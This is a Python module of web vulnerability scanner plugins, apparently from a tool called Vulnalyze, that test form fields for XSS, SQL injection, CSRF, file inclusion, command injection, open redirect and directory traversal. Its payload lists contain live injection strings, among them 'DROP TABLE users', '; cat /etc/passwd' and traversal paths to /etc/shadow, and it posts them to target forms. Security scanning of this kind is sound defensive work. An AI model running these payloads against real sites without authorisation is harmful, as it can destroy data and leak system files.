"""
Complete security scanning plugins for Vulnalyze
All vulnerability detection plugins with comprehensive implementations
"""
import requests
import urllib.parse
import requests
from bs4 import BeautifulSoup
from typing import List, Dict, Optional
import re
import time
import models 

class PluginBase:
    """Base class for security scanning plugins"""
    name = "BasePlugin"

    def scan(self, session: requests.Session, url: str, form: Optional[BeautifulSoup] = None) -> List[Dict]:
        """Scan for vulnerabilities - must be implemented by subclasses"""
        raise NotImplementedError("Plugin must implement scan method")

class XSSPlugin(PluginBase):
    """Cross-Site Scripting detection plugin"""
    name = "XSS"

    payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror='alert(\"XSS\")'></video>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<object data='javascript:alert(\"XSS\")'>"
]


    def scan(self, session: requests.Session, url: str, form: Optional[BeautifulSoup] = None) -> List[Dict]:
        """Scan for XSS vulnerabilities in forms"""
        vulnerabilities = []
        if form is None:
            return vulnerabilities

        try:
            action = form.get('action') or url
            action_url = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()

            # Get form inputs
            inputs = []
            for tag in form.find_all(['input', 'textarea', 'select']):
                name = tag.get('name')
                input_type = tag.get('type', '').lower()
                if name and input_type not in ['hidden', 'submit', 'button', 'file']:
                    inputs.append(name)

            if not inputs:
                return vulnerabilities

            # Prepare form data template
            data_template = {input_name: 'test' for input_name in inputs}

            # Add hidden inputs
            for hidden in form.find_all('input', {'type': 'hidden'}):
                name = hidden.get('name')
                if name:
                    data_template[name] = hidden.get('value', '')

            # Test each payload
            for payload in self.payloads:
                data = data_template.copy()
                # Inject payload into each input
                for key in inputs:
                    data[key] = payload

                try:
                    if method == 'post':
                        response = session.post(action_url, data=data, timeout=10)
                    else:
                        response = session.get(action_url, params=data, timeout=10)

                    # Check if payload is reflected in response
                    if payload in response.text or payload.replace('"', '&quot;') in response.text:
                        vulnerabilities.append({
                            'type': self.name,
                            'url': action_url,
                            'method': method.upper(),
                            'inputs': inputs,
                            'payload': payload,
                            'evidence': f"Payload '{payload}' reflected in response",
                            'severity': 'High'
                        })
                        break  # Found XSS, no need to test more payloads

                except requests.RequestException as e:
                    print(f"Request error during XSS scan: {e}")

        except Exception as e:
            print(f"Error in XSS plugin: {e}")

        return vulnerabilities

class SQLInjectionPlugin(PluginBase):
    """SQL Injection detection plugin"""
    name = "SQLi"

    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' OR 'a'='a",
        "1' OR '1'='1",
        "admin'--",
        "1; SELECT * FROM users",
        "' OR 1=1#",
        "' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "1' AND '1'='1",
        "' OR '1'='1' /*",
        "1' OR 1=1 LIMIT 1--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1' UNION SELECT @@version--",
        "' OR SLEEP(5)='",
        "1' OR BENCHMARK(1000000,MD5(1))='",
        "' UNION SELECT user()--"
    ]

    error_patterns = [
        "mysql_fetch_array",
        "ORA-[0-9]+",
        "PostgreSQL.*ERROR",
        "Warning.*mysql_",
        "valid MySQL result",
        "MySqlClient\\.",
        "SQLServer JDBC Driver",
        "SqlException",
        "Oracle error",
        "Oracle driver",
        "Microsoft OLE DB Provider for ODBC Drivers",
        "Unclosed quotation mark",
        "syntax error",
        "mysql_num_rows",
        "mysql_fetch_assoc",
        "mysql_fetch_row",
        "pg_exec",
        "Warning: pg_",
        "valid PostgreSQL result",
        "Npgsql\\.",
        "ERROR: column",
        "ERROR: relation",
        "ERROR: syntax error",
        "sqlite3.OperationalError",
        "SQLite error",
        "MySQL Error",
        "OLE DB Error"
    ]

    def scan(self, session: requests.Session, url: str, form: Optional[BeautifulSoup] = None) -> List[Dict]:
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []
        if form is None:
            return vulnerabilities

        try:
            action = form.get('action') or url
            action_url = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()

            # Get form inputs
            inputs = []
            for tag in form.find_all(['input', 'textarea', 'select']):
                name = tag.get('name')
                input_type = tag.get('type', '').lower()
                if name and input_type not in ['hidden', 'submit', 'button', 'file']:
                    inputs.append(name)

            if not inputs:
                return vulnerabilities

            # Prepare form data template
            data_template = {input_name: 'test' for input_name in inputs}

            # Add hidden inputs
            for hidden in form.find_all('input', {'type': 'hidden'}):
                name = hidden.get('name')
                if name:
                    data_template[name] = hidden.get('value', '')

            # Test each payload on each input
            for payload in self.payloads:
                for target_input in inputs:
                    data = data_template.copy()
                    data[target_input] = payload

                    try:
                        if method == 'post':
                            response = session.post(action_url, data=data, timeout=10)
                        else:
                            response = session.get(action_url, params=data, timeout=10)

                        # Check for SQL error messages
                        response_text = response.text.lower()
                        for pattern in self.error_patterns:
                            if re.search(pattern.lower(), response_text):
                                vulnerabilities.append({
                                    'type': self.name,
                                    'url': action_url,
                                    'method': method.upper(),
                                    'inputs': [target_input],
                                    'payload': payload,
                                    'evidence': f"SQL error pattern detected: {pattern}",
                                    'severity': 'High'
                                })
                                return vulnerabilities  # Found SQLi, stop testing

                    except requests.RequestException as e:
                        print(f"Request error during SQLi scan: {e}")

        except Exception as e:
            print(f"Error in SQLi plugin: {e}")

        return vulnerabilities

class CSRFPlugin(PluginBase):
    """Cross-Site Request Forgery detection plugin"""
    name = "CSRF"

    def scan(self, session: requests.Session, url: str, form: Optional[BeautifulSoup] = None) -> List[Dict]:
        """Scan for CSRF vulnerabilities"""
        vulnerabilities = []
        if form is None:
            return vulnerabilities

        try:
            action = form.get('action') or url
            action_url = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()

            # Only check POST forms for CSRF
            if method.lower() != 'post':
                return vulnerabilities

            # Look for CSRF tokens
            csrf_tokens = []
            csrf_indicators = [
                'csrf', 'token', '_token', 'authenticity_token',
                'csrfmiddlewaretoken', '_csrf', 'csrf_token',
                'anti_csrf', 'xsrf', '_xsrf', 'security_token'
            ]

            # Check for CSRF token inputs
            for input_tag in form.find_all('input'):
                input_name = input_tag.get('name', '').lower()
                input_type = input_tag.get('type', '').lower()
                if input_type == 'hidden':
                    for indicator in csrf_indicators:
                        if indicator in input_name:
                            csrf_tokens.append(input_name)
                            break

            # Check for meta CSRF tokens
            if form.find_parent('html'):
                html = form.find_parent('html')
                for meta in html.find_all('meta'):
                    name = meta.get('name', '').lower()
                    for indicator in csrf_indicators:
                        if indicator in name:
                            csrf_tokens.append(f"meta[name='{name}']")
                            break

            # If no CSRF protection found
            if not csrf_tokens:
                # Check if form modifies data (has inputs that suggest state change)
                state_changing_inputs = []
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_name = input_tag.get('name', '').lower()
                    input_type = input_tag.get('type', '').lower()

                    # Look for inputs that suggest data modification
                    if any(keyword in input_name for keyword in [
                        'password', 'email', 'delete', 'update', 'create',
                        'modify', 'change', 'edit', 'save', 'submit'
                    ]) or input_type in ['password', 'email']:
                        state_changing_inputs.append(input_name)

                if state_changing_inputs:
                    vulnerabilities.append({
                        'type': self.name,
                        'url': action_url,
                        'method': method.upper(),
                        'inputs': state_changing_inputs,
                        'payload': 'No CSRF token detected',
                        'evidence': f"Form with state-changing inputs lacks CSRF protection. Detected inputs: {', '.join(state_changing_inputs)}",
                        'severity': 'Medium'
                    })

        except Exception as e:
            print(f"Error in CSRF plugin: {e}")

        return vulnerabilities

class LFIPlugin(PluginBase):
    """Local File Inclusion detection plugin - COMPLETE IMPLEMENTATION"""
    name = "LFI"

    payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "../../../proc/version",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "../../../etc/shadow",
        "/proc/self/environ",
        "/etc/hosts",
        "../../../var/log/apache/access.log",
        "../../../usr/local/apache/logs/access_log",
        "/var/www/html/index.php",
        "php://filter/read=convert.base64-encode/resource=index.php"
    ]

    file_patterns = [
        r"root:.*:0:0:",  # /etc/passwd
        r"# Copyright.*hosts",  # hosts file
        r"Linux version",  # /proc/version
        r"root:\$[1-9]",  # /etc/shadow
        r"<\?php",  # PHP files
        r"127\.0\.0\.1",  # localhost in hosts
        r"USER=",  # environment variables
        r"apache|nginx|httpd",  # log files
        r"www-data|apache|nginx"  # web server users
    ]

    def scan(self, session: requests.Session, url: str, form: Optional[BeautifulSoup] = None) -> List[Dict]:
        """Scan for Local File Inclusion vulnerabilities"""
        vulnerabilities = []
        if form is None:
            return vulnerabilities

        try:
            action = form.get('action') or url
            action_url = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()

            # Get form inputs - prioritize file-related parameters
            inputs = []
            for tag in form.find_all(['input', 'textarea', 'select']):
                name = tag.get('name')
                input_type = tag.get('type', '').lower()
                if name and input_type not in ['hidden', 'submit', 'button', 'password']:
                    # Prioritize inputs with file-related names
                    if any(keyword in name.lower() for keyword in [
                        'file', 'path', 'page', 'include', 'template',
                        'doc', 'load', 'read', 'view', 'src'
                    ]):
                        inputs.insert(0, name)  # Add to front
                    else:
                        inputs.append(name)

            if not inputs:
                return vulnerabilities

            # Prepare form data template
            data_template = {input_name: 'test' for input_name in inputs}

            # Add hidden inputs
            for hidden in form.find_all('input', {'type': 'hidden'}):
                name = hidden.get('name')
                if name:
                    data_template[name] = hidden.get('value', '')

            # Test each payload on promising inputs
            for payload in self.payloads[:8]:  # Limit payloads to avoid too many requests
                for target_input in inputs[:3]:  # Test most promising inputs
                    data = data_template.copy()
                    data[target_input] = payload

                    try:
                        if method == 'post':
                            response = session.post(action_url, data=data, timeout=10)
                        else:
                            response = session.get(action_url, params=data, timeout=10)

                        # Check for file content patterns
                        response_text = response.text
                        for pattern in self.file_patterns:
                            if re.search(pattern, response_text, re.IGNORECASE):
                                vulnerabilities.append({
                                    'type': self.name,
                                    'url': action_url,
                                    'method': method.upper(),
                                    'inputs': [target_input],
                                    'payload': payload,
                                    'evidence': f"File content pattern detected: {pattern}",
                                    'severity': 'High'
                                })
                                return vulnerabilities  # Found LFI, stop testing

                    except requests.RequestException as e:
                        print(f"Request error during LFI scan: {e}")

        except Exception as e:
            print(f"Error in LFI plugin: {e}")

        return vulnerabilities

class CommandInjectionPlugin(PluginBase):
    """OS Command Injection detection plugin - COMPLETE IMPLEMENTATION"""
    name = "Command Injection"

    payloads = [
        "; whoami",
        "| whoami",
        "& whoami",
        "&& whoami",
        "|| whoami",
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "; id",
        "| id",
        "& id",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; ping -c 1 127.0.0.1",
        "| ping -c 1 127.0.0.1",
        "; sleep 5",
        "| sleep 5",
        "`whoami`",
        "$(whoami)",
        "`id`",
        "$(id)",
        "`ls`",
        "$(ls)",
        "%0a whoami",  # URL encoded newline
        "%0a id",
        "%0a ls"
    ]

    command_patterns = [
        r"uid=\d+.*gid=\d+",  # id command output
        r"root:.*:0:0:",  # /etc/passwd content
        r"www-data|apache|nginx",  # common web server users
        r"PING.*127\.0\.0\.1",  # ping command output
        r"bin.*usr.*var.*tmp",  # ls command output
        r"total \d+",  # ls -l output
        r"drwx|dr-x",  # directory permissions
        r":\d+:\d+:",  # /etc/passwd format
        r"Administrator|SYSTEM",  # Windows users
        r"C:\\|/home/|/root/",  # path indicators
    ]

    def scan(self, session: requests.Session, url: str, form: Optional[BeautifulSoup] = None) -> List[Dict]:
        """Scan for Command Injection vulnerabilities"""
        vulnerabilities = []
        if form is None:
            return vulnerabilities

        try:
            action = form.get('action') or url
            action_url = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()

            # Get form inputs
            inputs = []
            for tag in form.find_all(['input', 'textarea', 'select']):
                name = tag.get('name')
                input_type = tag.get('type', '').lower()
                if name and input_type not in ['hidden', 'submit', 'button', 'password', 'file']:
                    inputs.append(name)

            if not inputs:
                return vulnerabilities

            # Prepare form data template
            data_template = {input_name: 'test' for input_name in inputs}

            # Add hidden inputs
            for hidden in form.find_all('input', {'type': 'hidden'}):
                name = hidden.get('name')
                if name:
                    data_template[name] = hidden.get('value', '')

            # Test each payload
            for payload in self.payloads[:10]:  # Limit payloads
                for target_input in inputs[:2]:  # Test first 2 inputs
                    data = data_template.copy()
                    data[target_input] = payload

                    try:
                        start_time = time.time()
                        if method == 'post':
                            response = session.post(action_url, data=data, timeout=15)
                        else:
                            response = session.get(action_url, params=data, timeout=15)
                        response_time = time.time() - start_time

                        # Check for command output patterns
                        response_text = response.text
                        for pattern in self.command_patterns:
                            if re.search(pattern, response_text, re.IGNORECASE):
                                vulnerabilities.append({
                                    'type': self.name,
                                    'url': action_url,
                                    'method': method.upper(),
                                    'inputs': [target_input],
                                    'payload': payload,
                                    'evidence': f"Command output pattern detected: {pattern}",
                                    'severity': 'High'
                                })
                                return vulnerabilities  # Found command injection

                        # Check for time-based injection (sleep commands)
                        if 'sleep' in payload and response_time > 4:
                            vulnerabilities.append({
                                'type': self.name,
                                'url': action_url,
                                'method': method.upper(),
                                'inputs': [target_input],
                                'payload': payload,
                                'evidence': f"Time delay detected: {response_time:.2f}s (expected ~5s)",
                                'severity': 'High'
                            })
                            return vulnerabilities

                    except requests.RequestException as e:
                        print(f"Request error during Command Injection scan: {e}")

        except Exception as e:
            print(f"Error in Command Injection plugin: {e}")

        return vulnerabilities

class OpenRedirectPlugin(PluginBase):
    """Open Redirect detection plugin - COMPLETE IMPLEMENTATION"""
    name = "Open Redirect"

    test_domains = [
        "http://evil.com",
        "https://malicious-site.com", 
        "//evil.com",
        "//google.com",
        "http://127.0.0.1:8080",
        "https://attacker.com",
        "javascript:alert('redirect')",
        "ftp://malicious.com"
    ]

    def scan(self, session: requests.Session, url: str, form: Optional[BeautifulSoup] = None) -> List[Dict]:
        """Scan for Open Redirect vulnerabilities"""
        vulnerabilities = []
        if form is None:
            return vulnerabilities

        try:
            action = form.get('action') or url
            action_url = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()

            # Get form inputs - prioritize redirect-related parameters
            inputs = []
            for tag in form.find_all(['input', 'textarea', 'select']):
                name = tag.get('name')
                input_type = tag.get('type', '').lower()
                if name and input_type not in ['hidden', 'submit', 'button', 'password', 'file']:
                    # Prioritize inputs with redirect-related names
                    if any(keyword in name.lower() for keyword in [
                        'redirect', 'return', 'url', 'goto', 'next',
                        'continue', 'target', 'destination', 'forward',
                        'callback', 'returnurl', 'backurl'
                    ]):
                        inputs.insert(0, name)  # Add to front
                    else:
                        inputs.append(name)

            if not inputs:
                return vulnerabilities

            # Prepare form data template
            data_template = {input_name: 'test' for input_name in inputs}

            # Add hidden inputs
            for hidden in form.find_all('input', {'type': 'hidden'}):
                name = hidden.get('name')
                if name:
                    data_template[name] = hidden.get('value', '')

            # Test redirect domains
            for test_domain in self.test_domains[:4]:  # Limit test domains
                for target_input in inputs[:2]:  # Test most promising inputs
                    data = data_template.copy()
                    data[target_input] = test_domain

                    try:
                        # Don't follow redirects automatically
                        if method == 'post':
                            response = session.post(action_url, data=data, timeout=10, allow_redirects=False)
                        else:
                            response = session.get(action_url, params=data, timeout=10, allow_redirects=False)

                        # Check for redirect responses
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if test_domain in location or test_domain.replace('http://', '').replace('https://', '') in location:
                                vulnerabilities.append({
                                    'type': self.name,
                                    'url': action_url,
                                    'method': method.upper(),
                                    'inputs': [target_input],
                                    'payload': test_domain,
                                    'evidence': f"Redirect to external domain detected: {location}",
                                    'severity': 'Medium'
                                })
                                return vulnerabilities  # Found open redirect

                        # Also check for JavaScript redirects in response body
                        if 'javascript:' not in test_domain:  # Skip JS check for JS payloads
                            response_text = response.text.lower()
                            js_patterns = [
                                f"location.href.*{re.escape(test_domain.lower())}",
                                f"window.location.*{re.escape(test_domain.lower())}",
                                f"document.location.*{re.escape(test_domain.lower())}"
                            ]

                            for pattern in js_patterns:
                                if re.search(pattern, response_text):
                                    vulnerabilities.append({
                                        'type': self.name,
                                        'url': action_url,
                                        'method': method.upper(),
                                        'inputs': [target_input],
                                        'payload': test_domain,
                                        'evidence': f"JavaScript redirect detected: {pattern}",
                                        'severity': 'Medium'
                                    })
                                    return vulnerabilities

                    except requests.RequestException as e:
                        print(f"Request error during Open Redirect scan: {e}")

        except Exception as e:
            print(f"Error in Open Redirect plugin: {e}")

        return vulnerabilities

class DirectoryTraversalPlugin(PluginBase):
    """Directory Traversal detection plugin - COMPLETE IMPLEMENTATION"""
    name = "Directory Traversal"

    payloads = [
        "../",
        "..\\",
        "../../../",
        "..\\..\\..\\",
        "....//",
        "....\\\\",
        "%2e%2e%2f",  # URL encoded ../
        "%2e%2e%5c",  # URL encoded ..\
        "../%2f",
        "..%5c",
        "%252e%252e%252f",  # Double URL encoded
        "..%252f",
        "..%c0%af",  # Unicode encoding
        "..%c1%9c",
        ".%2e/",
        "%2e./",
        ".%2e\\",
        "%2e.\\"
    ]

    target_files = [
        "etc/passwd",
        "windows/system32/drivers/etc/hosts",
        "boot.ini",
        "etc/shadow",
        "windows/win.ini",
        "windows/system.ini",
        "etc/hosts",
        "proc/version",
        "etc/issue"
    ]

    def scan(self, session: requests.Session, url: str, form: Optional[BeautifulSoup] = None) -> List[Dict]:
        """Scan for Directory Traversal vulnerabilities"""
        vulnerabilities = []
        if form is None:
            return vulnerabilities

        try:
            action = form.get('action') or url
            action_url = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()

            # Get form inputs - prioritize file/path parameters
            inputs = []
            for tag in form.find_all(['input', 'textarea', 'select']):
                name = tag.get('name')
                input_type = tag.get('type', '').lower()
                if name and input_type not in ['hidden', 'submit', 'button', 'password']:
                    if any(keyword in name.lower() for keyword in [
                        'file', 'path', 'dir', 'folder', 'page', 'include',
                        'template', 'doc', 'load', 'read', 'view', 'src'
                    ]):
                        inputs.insert(0, name)
                    else:
                        inputs.append(name)

            if not inputs:
                return vulnerabilities

            # Prepare form data template
            data_template = {input_name: 'test' for input_name in inputs}

            # Add hidden inputs
            for hidden in form.find_all('input', {'type': 'hidden'}):
                name = hidden.get('name')
                if name:
                    data_template[name] = hidden.get('value', '')

            # Test directory traversal
            for payload in self.payloads[:5]:  # Limit payloads
                for target_file in self.target_files[:3]:  # Test common files
                    full_payload = payload + target_file
                    for target_input in inputs[:2]:  # Test most promising inputs
                        data = data_template.copy()
                        data[target_input] = full_payload

                        try:
                            if method == 'post':
                                response = session.post(action_url, data=data, timeout=10)
                            else:
                                response = session.get(action_url, params=data, timeout=10)

                            # Check for file content indicators
                            response_text = response.text.lower()

                            # File-specific patterns
                            if 'passwd' in target_file and 'root:' in response_text:
                                vulnerabilities.append({
                                    'type': self.name,
                                    'url': action_url,
                                    'method': method.upper(),
                                    'inputs': [target_input],
                                    'payload': full_payload,
                                    'evidence': f"Unix passwd file content detected",
                                    'severity': 'High'
                                })
                                return vulnerabilities

                            elif 'hosts' in target_file and ('localhost' in response_text or '127.0.0.1' in response_text):
                                vulnerabilities.append({
                                    'type': self.name,
                                    'url': action_url,
                                    'method': method.upper(),
                                    'inputs': [target_input],
                                    'payload': full_payload,
                                    'evidence': f"Hosts file content detected",
                                    'severity': 'High'
                                })
                                return vulnerabilities

                            elif 'boot.ini' in target_file and ('[boot loader]' in response_text or 'multi(' in response_text):
                                vulnerabilities.append({
                                    'type': self.name,
                                    'url': action_url,
                                    'method': method.upper(),
                                    'inputs': [target_input],
                                    'payload': full_payload,
                                    'evidence': f"Windows boot.ini content detected",
                                    'severity': 'High'
                                })
                                return vulnerabilities

                        except requests.RequestException as e:
                            print(f"Request error during Directory Traversal scan: {e}")

        except Exception as e:
            print(f"Error in Directory Traversal plugin: {e}")

        return vulnerabilities

def load_plugins(plugin_names: List[str] = None) -> List[PluginBase]:
    """Load and return list of scanning plugins"""
    available_plugins = {
        'xss': XSSPlugin(),
        'sqli': SQLInjectionPlugin(),
        'sql': SQLInjectionPlugin(),  # Alias for SQLi
        'csrf': CSRFPlugin(),
        'lfi': LFIPlugin(),
        'command': CommandInjectionPlugin(),
        'cmdi': CommandInjectionPlugin(),  # Alias
        'redirect': OpenRedirectPlugin(),
        'traversal': DirectoryTraversalPlugin(),
        'directory': DirectoryTraversalPlugin()  # Alias
    }

    if plugin_names is None:
        # Return all plugins if none specified
        return [
            XSSPlugin(),
            SQLInjectionPlugin(),
            CSRFPlugin(),
            LFIPlugin(),
            CommandInjectionPlugin(),
            OpenRedirectPlugin(),
            DirectoryTraversalPlugin()
        ]

    loaded_plugins = []
    for name in plugin_names:
        plugin_name = name.lower().strip()
        if plugin_name in available_plugins:
            loaded_plugins.append(available_plugins[plugin_name])

    # Return all plugins if none were found
    return loaded_plugins if loaded_plugins else [
        XSSPlugin(),
        SQLInjectionPlugin(),
        CSRFPlugin(),
        LFIPlugin(),
        CommandInjectionPlugin(),
        OpenRedirectPlugin(),
        DirectoryTraversalPlugin()
    ]

def get_available_plugins():
    """Get list of available plugins with descriptions"""
    return {
        'xss': {
            'name': 'Cross-Site Scripting (XSS)',
            'description': 'Detects script injection vulnerabilities',
            'severity': 'High'
        },
        'sqli': {
            'name': 'SQL Injection',
            'description': 'Identifies SQL injection flaws',
            'severity': 'Critical'
        },
        'csrf': {
            'name': 'CSRF Protection',
            'description': 'Validates CSRF protection implementation',
            'severity': 'Medium'
        },
        'lfi': {
            'name': 'Local File Inclusion',
            'description': 'Finds local file inclusion vulnerabilities',
            'severity': 'High'
        },
        'command': {
            'name': 'Command Injection',
            'description': 'Discovers OS command injection flaws',
            'severity': 'Critical'
        },
        'redirect': {
            'name': 'Open Redirect',
            'description': 'Checks for open redirect vulnerabilities',
            'severity': 'Medium'
        },
        'traversal': {
            'name': 'Directory Traversal',
            'description': 'Detects path traversal vulnerabilities',
            'severity': 'High'
        }
    }
